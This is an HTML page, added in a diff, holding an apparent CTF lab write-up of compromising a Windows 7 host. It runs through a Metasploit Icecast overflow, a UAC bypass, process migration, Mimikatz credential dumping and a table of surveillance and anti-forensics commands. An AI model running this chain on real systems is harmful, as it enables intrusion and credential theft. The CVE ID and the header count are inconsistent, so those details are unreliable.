@@ -1,0 +1,792 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ICE CTF | Leona Kokerai</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #0a0a0a;
+    --surface: #111111;
+    --border: #1e1e1e;
+    --green: #00ff41;
+    --green-dim: #00cc33;
+    --green-muted: #00441a;
+    --amber: #ffb300;
+    --red: #ff3c38;
+    --blue: #4fc3f7;
+    --text: #d4d4d4;
+    --text-muted: #666;
+    --mono: 'Share Tech Mono', monospace;
+    --sans: 'Syne', sans-serif;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--sans);
+    line-height: 1.7;
+    overflow-x: hidden;
+  }
+
+  body::before {
+    content: '';
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    background: repeating-linear-gradient(
+      0deg, transparent, transparent 2px,
+      rgba(0,255,65,0.012) 2px, rgba(0,255,65,0.012) 4px
+    );
+    pointer-events: none;
+    z-index: 9999;
+  }
+
+  .container { max-width: 820px; margin: 0 auto; padding: 0 24px; }
+
+  header {
+    border-bottom: 1px solid var(--border);
+    padding: 40px 0 32px;
+    margin-bottom: 60px;
+  }
+
+  .header-tag {
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--blue);
+    letter-spacing: 3px;
+    text-transform: uppercase;
+    margin-bottom: 16px;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+
+  .header-tag::before {
+    content: '';
+    display: inline-block;
+    width: 20px; height: 1px;
+    background: var(--blue);
+  }
+
+  h1 {
+    font-family: var(--sans);
+    font-size: clamp(2rem, 5vw, 3.2rem);
+    font-weight: 800;
+    line-height: 1.1;
+    color: #fff;
+    letter-spacing: -1px;
+    margin-bottom: 16px;
+  }
+
+  h1 span { color: var(--blue); }
+
+  .meta {
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    font-family: var(--mono);
+    font-size: 12px;
+    color: var(--text-muted);
+    flex-wrap: wrap;
+  }
+
+  .meta-badge {
+    padding: 3px 10px;
+    border: 1px solid var(--border);
+    border-radius: 2px;
+  }
+
+  .meta-badge.windows { border-color: var(--blue); color: var(--blue); }
+  .meta-badge.msf { border-color: var(--amber); color: var(--amber); }
+  .meta-badge.easy { border-color: #444; color: #888; }
+
+  .intro-block {
+    background: #0a0f1a;
+    border-left: 3px solid var(--blue);
+    padding: 20px 24px;
+    margin-bottom: 48px;
+    font-size: 15px;
+    color: #aaa;
+    line-height: 1.8;
+    border-radius: 0 4px 4px 0;
+  }
+
+  .intro-block strong { color: var(--text); }
+
+  .phase { margin: 56px 0 28px; }
+
+  .phase-num {
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--blue);
+    letter-spacing: 3px;
+    text-transform: uppercase;
+    margin-bottom: 6px;
+  }
+
+  .phase h2 {
+    font-size: 1.4rem;
+    font-weight: 700;
+    color: #fff;
+    letter-spacing: -0.3px;
+  }
+
+  p {
+    font-size: 15px;
+    color: var(--text);
+    margin-bottom: 16px;
+    line-height: 1.8;
+  }
+
+  .terminal {
+    background: #050505;
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    margin: 20px 0;
+    overflow: hidden;
+  }
+
+  .terminal-bar {
+    background: #161616;
+    padding: 8px 14px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .dot { width: 10px; height: 10px; border-radius: 50%; }
+  .dot.r { background: #ff5f57; }
+  .dot.y { background: #ffbd2e; }
+  .dot.g { background: #28ca41; }
+
+  .terminal-label {
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--text-muted);
+    margin-left: 6px;
+    letter-spacing: 1px;
+  }
+
+  .terminal-body {
+    padding: 18px 20px;
+    font-family: var(--mono);
+    font-size: 13px;
+    line-height: 1.9;
+  }
+
+  .cmd { color: var(--green); }
+  .comment { color: #2a4a2a; }
+  .flag-val { color: var(--amber); }
+  .out { color: #666; }
+  .success { color: var(--green-dim); }
+  .highlight { color: var(--blue); }
+  .warn-text { color: var(--red); }
+
+  .insight {
+    background: #0d1a0d;
+    border: 1px solid #1a3a1a;
+    border-radius: 4px;
+    padding: 16px 20px;
+    margin: 20px 0;
+    display: flex;
+    gap: 14px;
+  }
+
+  .insight-icon { font-size: 18px; flex-shrink: 0; margin-top: 1px; }
+
+  .insight-text {
+    font-size: 14px;
+    color: #8fb88f;
+    line-height: 1.7;
+    margin: 0;
+  }
+
+  .insight-text strong { color: var(--green); }
+  .insight-text a { color: var(--green); }
+
+  .warning {
+    background: #1a1200;
+    border: 1px solid #3a2800;
+    border-radius: 4px;
+    padding: 16px 20px;
+    margin: 20px 0;
+    display: flex;
+    gap: 14px;
+  }
+
+  .warning .insight-text { color: #c4a44a; }
+  .warning .insight-text strong { color: var(--amber); }
+
+  .info-block {
+    background: #080f1a;
+    border: 1px solid #0d2040;
+    border-radius: 4px;
+    padding: 16px 20px;
+    margin: 20px 0;
+    display: flex;
+    gap: 14px;
+  }
+
+  .info-block .insight-text { color: #6baed6; }
+  .info-block .insight-text strong { color: var(--blue); }
+
+  .key-found {
+    background: #050f05;
+    border: 1px solid var(--green-muted);
+    border-radius: 4px;
+    padding: 16px 20px;
+    margin: 24px 0;
+    display: flex;
+    align-items: center;
+    gap: 16px;
+  }
+
+  .key-icon { font-size: 24px; }
+
+  .key-text {
+    font-family: var(--mono);
+    font-size: 13px;
+    color: var(--green);
+  }
+
+  .key-label {
+    font-size: 10px;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    color: var(--text-muted);
+    margin-bottom: 3px;
+  }
+
+  .steps { list-style: none; margin: 16px 0; }
+
+  .steps li {
+    padding: 7px 0 7px 20px;
+    position: relative;
+    font-size: 14px;
+    color: var(--text);
+    border-bottom: 1px solid #151515;
+  }
+
+  .steps li::before {
+    content: '→';
+    position: absolute;
+    left: 0;
+    color: var(--blue);
+    font-family: var(--mono);
+  }
+
+  /* attack chain diagram */
+  .chain {
+    display: flex;
+    align-items: center;
+    gap: 0;
+    margin: 28px 0;
+    overflow-x: auto;
+    padding-bottom: 8px;
+  }
+
+  .chain-node {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    padding: 10px 14px;
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--text-muted);
+    text-align: center;
+    white-space: nowrap;
+    flex-shrink: 0;
+  }
+
+  .chain-node.active {
+    border-color: var(--blue);
+    color: var(--blue);
+  }
+
+  .chain-arrow {
+    font-family: var(--mono);
+    color: #333;
+    padding: 0 6px;
+    font-size: 14px;
+    flex-shrink: 0;
+  }
+
+  .cve-card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    padding: 20px 24px;
+    margin: 20px 0;
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 16px;
+  }
+
+  @media (max-width: 500px) { .cve-card { grid-template-columns: 1fr; } }
+
+  .cve-field label {
+    display: block;
+    font-family: var(--mono);
+    font-size: 10px;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    color: var(--text-muted);
+    margin-bottom: 4px;
+  }
+
+  .cve-field span {
+    font-family: var(--mono);
+    font-size: 14px;
+    color: var(--text);
+  }
+
+  .cve-field span.bad { color: var(--red); }
+  .cve-field span.cve-id { color: var(--blue); }
+
+  /* Post-exploitation table */
+  .post-table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 20px 0;
+    font-size: 13px;
+  }
+
+  .post-table th {
+    font-family: var(--mono);
+    font-size: 10px;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    color: var(--text-muted);
+    text-align: left;
+    padding: 8px 12px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .post-table td {
+    padding: 10px 12px;
+    border-bottom: 1px solid #151515;
+    color: var(--text);
+    vertical-align: top;
+  }
+
+  .post-table td:first-child {
+    font-family: var(--mono);
+    color: var(--green);
+    font-size: 12px;
+    white-space: nowrap;
+  }
+
+  .post-table tr:hover td { background: #111; }
+
+  hr {
+    border: none;
+    border-top: 1px solid var(--border);
+    margin: 48px 0;
+  }
+
+  code {
+    font-family: var(--mono);
+    font-size: 12px;
+    background: #161616;
+    color: var(--blue);
+    padding: 2px 6px;
+    border-radius: 3px;
+    border: 1px solid #222;
+  }
+
+  footer {
+    border-top: 1px solid var(--border);
+    padding: 32px 0;
+    margin-top: 72px;
+    text-align: center;
+    font-family: var(--mono);
+    font-size: 12px;
+    color: var(--text-muted);
+  }
+
+  footer span { color: var(--blue); }
+
+  @keyframes blink {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0; }
+  }
+
+  .cursor {
+    display: inline-block;
+    width: 8px; height: 14px;
+    background: var(--blue);
+    animation: blink 1.1s step-end infinite;
+    vertical-align: text-bottom;
+    margin-left: 3px;
+  }
+</style>
+</head>
+<body>
+<div class="container">
+
+  <header>
+    <div class="header-tag">TryHackMe · Windows CTF Writeup</div>
+    <h1>ICE: <span>Breaking a Windows Machine</span></h1>
+    <div class="meta">
+      <span class="meta-badge easy">Easy</span>
+      <span class="meta-badge windows">Windows</span>
+      <span class="meta-badge msf">Metasploit</span>
+      <span>Leona Kokerai</span>
+      <span>2024</span>
+    </div>
+  </header>
+
+  <div class="intro-block">
+    <strong>Why this room matters to me:</strong> Most of my CTF work lives in Linux environments, so ICE was a deliberate push into Windows exploitation - a gap I needed to close. Real enterprise environments are overwhelmingly Windows. This room chains CVE research, Metasploit module usage, UAC bypass, and credential dumping into one compact scenario. The skills here are directly transferable to real engagements. I'm documenting not just the steps, but the <em>reasoning behind each decision</em>.
+  </div>
+
+  <!-- Attack chain overview -->
+  <div class="chain">
+    <div class="chain-node active">Recon</div>
+    <div class="chain-arrow">──▶</div>
+    <div class="chain-node active">CVE-2004-9091</div>
+    <div class="chain-arrow">──▶</div>
+    <div class="chain-node active">Meterpreter</div>
+    <div class="chain-arrow">──▶</div>
+    <div class="chain-node active">UAC Bypass</div>
+    <div class="chain-arrow">──▶</div>
+    <div class="chain-node active">SYSTEM</div>
+    <div class="chain-arrow">──▶</div>
+    <div class="chain-node active">Creds Dumped</div>
+  </div>
+
+  <!-- PHASE 1 -->
+  <div class="phase">
+    <div class="phase-num">Phase 01</div>
+    <h2>Reconnaissance - A Windows Target Changes Everything</h2>
+  </div>
+
+  <p>My nmap approach shifts slightly for Windows targets. Windows runs services on non-standard ports - RDP, SMB, WinRM - and the OS detection flag <code>-O</code> gives me confirmation early rather than inferring from service names later. I'm also scanning all 65,535 ports with <code>-p-</code> because Windows hosts frequently run services on unusual high ports.</p>
+
+  <div class="terminal">
+    <div class="terminal-bar">
+      <div class="dot r"></div><div class="dot y"></div><div class="dot g"></div>
+      <span class="terminal-label">nmap - full port scan</span>
+    </div>
+    <div class="terminal-body">
+<span class="cmd">nmap -sC -sS -sV -p- -O -T4 &lt;TARGET_IP&gt;</span><br><br>
+<span class="comment"># -sC  → default script suite (grabs banners, checks common vulns)</span><br>
+<span class="comment"># -sS  → SYN scan (stealthy, doesn't complete TCP handshake)</span><br>
+<span class="comment"># -sV  → service version detection</span><br>
+<span class="comment"># -p-  → all ports, not just top 1000</span><br>
+<span class="comment"># -O   → OS fingerprinting</span><br>
+<span class="comment"># -T4  → aggressive timing (assumes stable network)</span><br><br>
+<span class="out">PORT      STATE  SERVICE            VERSION</span><br>
+<span class="success">135/tcp   open   msrpc              Microsoft Windows RPC</span><br>
+<span class="success">139/tcp   open   netbios-ssn        Microsoft Windows netbios-ssn</span><br>
+<span class="success">445/tcp   open   microsoft-ds       Windows 7 SP1</span><br>
+<span class="highlight">8000/tcp  open   http               Icecast streaming media server</span><br>
+<span class="success">3389/tcp  open   ssl/ms-wbt-server  (RDP)</span><br>
+<span class="out">... 5 additional ports ...</span><br><br>
+<span class="out">OS: Windows 7 SP1</span><br>
+<span class="flag-val">Hostname: DARK-PC</span>
+    </div>
+  </div>
+
+  <div class="insight">
+    <div class="insight-icon">💡</div>
+    <p class="insight-text">Ten open ports. The one that immediately stands out is <strong>port 8000 running Icecast</strong> - a media streaming server. Icecast is not a core Windows service, which means someone installed it deliberately. Non-standard third-party software running on a production machine is almost always the weakest link in the chain. That's where I'm going first.<br><br>The hostname <strong>DARK-PC</strong> also tells me this is a single workstation, not a domain controller - important context for what post-exploitation looks like.</p>
+  </div>
+
+  <!-- PHASE 2 -->
+  <div class="phase">
+    <div class="phase-num">Phase 02</div>
+    <h2>Vulnerability Research - Finding the Right CVE</h2>
+  </div>
+
+  <p>Before I fire up Metasploit, I want to understand <em>what</em> I'm exploiting and <em>why it works</em>. Blindly running modules is how people get caught - or worse, break production systems on real engagements. Looking up the CVE first is a discipline I try to maintain.</p>
+
+  <p>A quick search for "Icecast vulnerability" surfaces <strong>CVE-2004-9091</strong> immediately. Here's what the vulnerability actually is:</p>
+
+  <div class="cve-card">
+    <div class="cve-field">
+      <label>CVE ID</label>
+      <span class="cve-id">CVE-2004-9091</span>
+    </div>
+    <div class="cve-field">
+      <label>Impact Score</label>
+      <span class="bad">6.4 (High)</span>
+    </div>
+    <div class="cve-field">
+      <label>Vulnerability Type</label>
+      <span>HTTP Header Overflow</span>
+    </div>
+    <div class="cve-field">
+      <label>Attack Vector</label>
+      <span>Network (unauthenticated)</span>
+    </div>
+  </div>
+
+  <div class="info-block">
+    <div class="insight-icon">🔍</div>
+    <p class="insight-text"><strong>What the vulnerability actually does:</strong> Icecast's HTTP request handler fails to properly validate the number of headers in an incoming request. By sending a request with exactly 32 headers, an attacker can overflow a stack buffer and overwrite the saved return address - a classic stack-based buffer overflow. The attacker controls where execution jumps next. No authentication required. Full code execution from the network.</p>
+  </div>
+
+  <p>This is why old, unpatched software running on exposed ports is so dangerous. Icecast had a patch for this. The machine never applied it. That gap is the entire attack surface.</p>
+
+  <!-- PHASE 3 -->
+  <div class="phase">
+    <div class="phase-num">Phase 03</div>
+    <h2>Exploitation - Metasploit, Used Deliberately</h2>
+  </div>
+
+  <p>Metasploit gets a bad reputation in some circles - seen as a crutch that prevents real learning. I disagree with that framing. Metasploit is a professional tool used by red teams and pentesters daily. The skill is knowing <em>which module to use, why, and what it's doing under the hood</em>.</p>
+
+  <div class="terminal">
+    <div class="terminal-bar">
+      <div class="dot r"></div><div class="dot y"></div><div class="dot g"></div>
+      <span class="terminal-label">msfconsole</span>
+    </div>
+    <div class="terminal-body">
+<span class="cmd">msfconsole</span><br><br>
+<span class="cmd">msf6 &gt; search icecast</span><br><br>
+<span class="out">Matching Modules</span><br>
+<span class="out">================</span><br>
+<span class="highlight">   0  exploit/windows/http/icecast_header  2004-09-28  great  Yes  Icecast Header Overflow</span><br><br>
+<span class="cmd">msf6 &gt; use exploit/windows/http/icecast_header</span><br>
+<span class="cmd">msf6 exploit(icecast_header) &gt; show options</span><br><br>
+<span class="out">   Name    Current Setting  Required  Description</span><br>
+<span class="out">   ----    ---------------  --------  -----------</span><br>
+<span class="out">   RHOSTS                   yes       Target IP</span><br>
+<span class="out">   RPORT   8000             yes       Target port (default: 8000)</span><br>
+<span class="out">   LHOST                    yes       Your machine IP</span><br>
+<span class="out">   LPORT   4444             yes       Callback port</span>
+    </div>
+  </div>
+
+  <div class="warning">
+    <div class="insight-icon">⚠️</div>
+    <p class="insight-text"><strong>Always check LHOST manually.</strong> Metasploit sometimes auto-populates LHOST with a loopback address (127.0.0.1) or the wrong interface. On TryHackMe, my LHOST must be my VPN-assigned tun0 IP - not my local LAN address. A wrong LHOST is the most common reason a shell silently fails to connect back.</p>
+  </div>
+
+  <div class="terminal">
+    <div class="terminal-bar">
+      <div class="dot r"></div><div class="dot y"></div><div class="dot g"></div>
+      <span class="terminal-label">setting options and firing</span>
+    </div>
+    <div class="terminal-body">
+<span class="cmd">msf6 exploit(icecast_header) &gt; set RHOSTS &lt;TARGET_IP&gt;</span><br>
+<span class="cmd">msf6 exploit(icecast_header) &gt; set LHOST &lt;YOUR_VPN_IP&gt;</span><br>
+<span class="cmd">msf6 exploit(icecast_header) &gt; run</span><br><br>
+<span class="out">[*] Started reverse TCP handler on &lt;YOUR_IP&gt;:4444</span><br>
+<span class="out">[*] Sending 31 headers...</span><br>
+<span class="success">[*] Meterpreter session 1 opened</span><br><br>
+<span class="cmd">meterpreter &gt; getuid</span><br>
+<span class="flag-val">Server username: DARK-PC\dark</span><br><br>
+<span class="cmd">meterpreter &gt; sysinfo</span><br>
+<span class="out">Computer    : DARK-PC</span><br>
+<span class="out">OS          : Windows 7 (Build 7601, Service Pack 1)</span><br>
+<span class="flag-val">Architecture: x64</span>
+    </div>
+  </div>
+
+  <div class="insight">
+    <div class="insight-icon">💡</div>
+    <p class="insight-text">I'm in as user <strong>dark</strong> - a standard user, not an administrator. This is a common landing position: code execution, but limited privilege. The machine is <strong>Windows 7 SP1 (Build 7601)</strong> - a goldmine for privilege escalation vectors, since Windows 7 reached end-of-life in 2020 and accumulates unpatched vulnerabilities rapidly. The x64 architecture matters - it determines which payloads and migration targets are compatible.</p>
+  </div>
+
+  <!-- PHASE 4 -->
+  <div class="phase">
+    <div class="phase-num">Phase 04</div>
+    <h2>Privilege Escalation - Bypassing UAC</h2>
+  </div>
+
+  <p>Running as a standard user, I need to escalate. Metasploit includes a post-exploitation module that automatically suggests escalation paths based on the target's running processes and OS version.</p>
+
+  <div class="terminal">
+    <div class="terminal-bar">
+      <div class="dot r"></div><div class="dot y"></div><div class="dot g"></div>
+      <span class="terminal-label">local exploit suggester</span>
+    </div>
+    <div class="terminal-body">
+<span class="cmd">meterpreter &gt; run post/multi/recon/local_exploit_suggester</span><br><br>
+<span class="out">[*] Running checks against session 1...</span><br>
+<span class="success">[+] exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.</span><br>
+<span class="out">[+] exploit/windows/local/ms10_015_kitrap0d: ...</span><br>
+<span class="out">[+] exploit/windows/local/ms10_092_schelevator: ...</span>
+    </div>
+  </div>
+
+  <p>The first suggestion - <code>bypassuac_eventvwr</code> - is the one I'll use. Here's what it actually does: Windows' Event Viewer (<code>eventvwr.exe</code>) is a trusted process that auto-elevates without triggering a UAC prompt. This module hijacks the registry path that Event Viewer reads on launch, substituting it with a malicious path pointing to our payload. When Event Viewer runs (which it does silently), it executes our code with elevated privileges.</p>
+
+  <div class="terminal">
+    <div class="terminal-bar">
+      <div class="dot r"></div><div class="dot y"></div><div class="dot g"></div>
+      <span class="terminal-label">UAC bypass</span>
+    </div>
+    <div class="terminal-body">
+<span class="comment"># Background current session, preserve it for later</span><br>
+<span class="cmd">meterpreter &gt; background</span><br>
+<span class="out">[*] Backgrounding session 1...</span><br><br>
+<span class="cmd">msf6 &gt; use exploit/windows/local/bypassuac_eventvwr</span><br>
+<span class="cmd">msf6 exploit(bypassuac_eventvwr) &gt; set SESSION 1</span><br>
+<span class="cmd">msf6 exploit(bypassuac_eventvwr) &gt; set LHOST &lt;YOUR_VPN_IP&gt;</span><br>
+<span class="cmd">msf6 exploit(bypassuac_eventvwr) &gt; run</span><br><br>
+<span class="success">[*] Meterpreter session 2 opened (elevated)</span><br><br>
+<span class="cmd">meterpreter &gt; getprivs</span><br>
+<span class="flag-val">SeTakeOwnershipPrivilege</span><br>
+<span class="flag-val">SeDebugPrivilege</span><br>
+<span class="flag-val">SeImpersonatePrivilege</span><br>
+<span class="out">... additional privileges ...</span>
+    </div>
+  </div>
+
+  <div class="insight">
+    <div class="insight-icon">💡</div>
+    <p class="insight-text"><strong>SeTakeOwnershipPrivilege</strong> is the one to note. It allows the token holder to take ownership of any securable object - files, registry keys, processes - regardless of the existing ACL. In a real environment, this privilege alone could enable an attacker to read any file on the system, including SAM databases and sensitive documents.</p>
+  </div>
+
+  <!-- PHASE 5 -->
+  <div class="phase">
+    <div class="phase-num">Phase 05</div>
+    <h2>Process Migration - Becoming SYSTEM</h2>
+  </div>
+
+  <p>Elevated privileges aren't the same as SYSTEM. To access LSASS (which holds cached credentials), I need to run as <code>NT AUTHORITY\SYSTEM</code> and match LSASS's architecture. The approach: migrate my Meterpreter session into a SYSTEM process that runs as x64.</p>
+
+  <ul class="steps">
+    <li>Run <code>ps</code> to list all running processes with their PID, architecture, and owner</li>
+    <li>Identify a process running as <code>NT AUTHORITY\SYSTEM</code> in x64 architecture</li>
+    <li><code>spoolsv.exe</code> (Print Spooler) meets both criteria - always present, always SYSTEM, x64</li>
+    <li>Migrate into it; my session now inherits SYSTEM-level privileges</li>
+  </ul>
+
+  <div class="terminal">
+    <div class="terminal-bar">
+      <div class="dot r"></div><div class="dot y"></div><div class="dot g"></div>
+      <span class="terminal-label">process migration</span>
+    </div>
+    <div class="terminal-body">
+<span class="cmd">meterpreter &gt; ps</span><br><br>
+<span class="out"> PID   Name          Arch  User</span><br>
+<span class="out"> ---   ----          ----  ----</span><br>
+<span class="highlight"> 1272  spoolsv.exe   x64   NT AUTHORITY\SYSTEM</span><br>
+<span class="out"> ...   lsass.exe     x64   NT AUTHORITY\SYSTEM</span><br><br>
+<span class="cmd">meterpreter &gt; migrate 1272</span><br>
+<span class="out">[*] Migrating from 2180 to 1272...</span><br>
+<span class="success">[*] Migration completed successfully.</span><br><br>
+<span class="cmd">meterpreter &gt; getuid</span><br>
+<span class="success">Server username: NT AUTHORITY\SYSTEM</span>
+    </div>
+  </div>
+
+  <div class="warning">
+    <div class="insight-icon">⚠️</div>
+    <p class="insight-text"><strong>Why not migrate directly into lsass.exe - </strong> Migrating into LSASS itself is risky - if the migration causes LSASS to crash, Windows triggers an automatic reboot (it's a critical process). <code>spoolsv.exe</code> is stable, always running, and grants the same SYSTEM token we need. It's the safer route to the same destination.</p>
+  </div>
+
+  <!-- PHASE 6 -->
+  <div class="phase">
+    <div class="phase-num">Phase 06</div>
+    <h2>Credential Dumping - Kiwi and the LSASS Cache</h2>
+  </div>
+
+  <p>Now running as SYSTEM, I load <code>kiwi</code> - the Meterpreter implementation of Mimikatz. Mimikatz exploits the way Windows caches credentials in LSASS memory to expose plaintext passwords, hashes, and Kerberos tickets. It's one of the most consequential tools in post-exploitation.</p>
+
+  <div class="terminal">
+    <div class="terminal-bar">
+      <div class="dot r"></div><div class="dot y"></div><div class="dot g"></div>
+      <span class="terminal-label">kiwi - credential extraction</span>
+    </div>
+    <div class="terminal-body">
+<span class="cmd">meterpreter &gt; load kiwi</span><br>
+<span class="out">Loading extension kiwi...</span><br>
+<span class="success">Success.</span><br><br>
+<span class="cmd">meterpreter &gt; creds_all</span><br><br>
+<span class="out">Username  Domain   Password</span><br>
+<span class="out">--------  ------   --------</span><br>
+<span class="flag-val">dark      DARK-PC  Password01!</span>
+    </div>
+  </div>
+
+  <div class="key-found">
+    <div class="key-icon">🔑</div>
+    <div>
+      <div class="key-label">Credentials Dumped</div>
+      <div class="key-text">dark : Password01! - machine fully owned. <span class="cursor"></span></div>
+    </div>
+  </div>
+
+  <!-- Post-exploitation reference -->
+  <div class="phase">
+    <div class="phase-num">Reference</div>
+    <h2>Post-Exploitation Capabilities - The Toolkit</h2>
+  </div>
+
+  <p>With SYSTEM-level Meterpreter, the post-exploitation surface is extensive. Here are the key capabilities I explored, grouped by what they enable in a real engagement:</p>
+
+  <table class="post-table">
+    <thead>
+      <tr>
+        <th>Command</th>
+        <th>What it does</th>
+        <th>Real-world relevance</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>hashdump</td>
+        <td>Dumps all local SAM password hashes</td>
+        <td>Pass-the-hash attacks, offline cracking, lateral movement</td>
+      </tr>
+      <tr>
+        <td>screenshare</td>
+        <td>Streams the target's live desktop</td>
+        <td>Surveillance, capturing credentials typed in real time</td>
+      </tr>
+      <tr>
+        <td>record_mic</td>
+        <td>Records audio from attached microphone</td>
+        <td>Covert intelligence gathering in physical environments</td>
+      </tr>
+      <tr>
+        <td>timestomp</td>
+        <td>Modifies file timestamps</td>
+        <td>Anti-forensics - hiding when files were created or accessed</td>
+      </tr>
+      <tr>
+        <td>golden_ticket_create</td>
+        <td>Forges Kerberos authentication ticket</td>
+        <td>Persistent domain access even after password resets (AD environments)</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <div class="info-block">
+    <div class="insight-icon">🖥️</div>
+    <p class="insight-text"><strong>On RDP as a persistence mechanism:</strong> The credentials we dumped work over RDP (port 3389 was open in our initial scan). On real engagements this is significant - but it carries a risk. Windows workstations enforce single-session RDP by default. Connecting via RDP while the legitimate user is active <strong>kicks them off their own machine</strong>. On a covert engagement, that's an immediate detection event. Knowing <em>when not</em> to use a capability is as important as knowing you have it.</p>
+  </div>
+
+  <hr>
+
+  <div class="phase">
+    <div class="phase-num">Reflections</div>
+    <h2>What ICE Actually Taught Me</h2>
+  </div>
+
+  <p>The ICE room looks simple on the surface - run nmap, fire an exploit, escalate, dump creds. But the underlying lessons are deeper than the steps suggest.</p>
+
+  <p>The first is about <strong>unpatched software as organisational risk</strong>. CVE-2004-9091 is twenty years old. The fix existed. The reason this machine was vulnerable had nothing to do with the attacker's sophistication - it was entirely an operational failure. In my penetration testing work, I've seen similar patterns: companies running current Windows versions with ancient third-party software that never gets patched because it's "working fine." Icecast on a media server. Legacy Java on a dev machine. These are the doors that stay unlocked.</p>
+
+  <p>The second is about <strong>privilege as a layered problem</strong>. Getting code execution doesn't mean you own the machine. Getting elevated privileges doesn't mean you're SYSTEM. Each layer requires its own technique, its own awareness of architecture compatibility, its own caution about side effects. The migration step especially - understanding <em>why</em> spoolsv.exe and not lsass.exe - that distinction only comes from actually understanding what these processes are, not just following a walkthrough.</p>
+
+  <p>Windows post-exploitation is a discipline in itself. I'll be returning to it.</p>
+
+  <footer>
+    <div>Leona Kokerai · Cybersecurity Portfolio · <span>TryHackMe Top 3%</span></div>
+    <div style="margin-top:8px; color:#333">All testing conducted in authorised TryHackMe lab environments. Educational purposes only.</div>
+  </footer>
+
+</div>
+</body>
+</html>
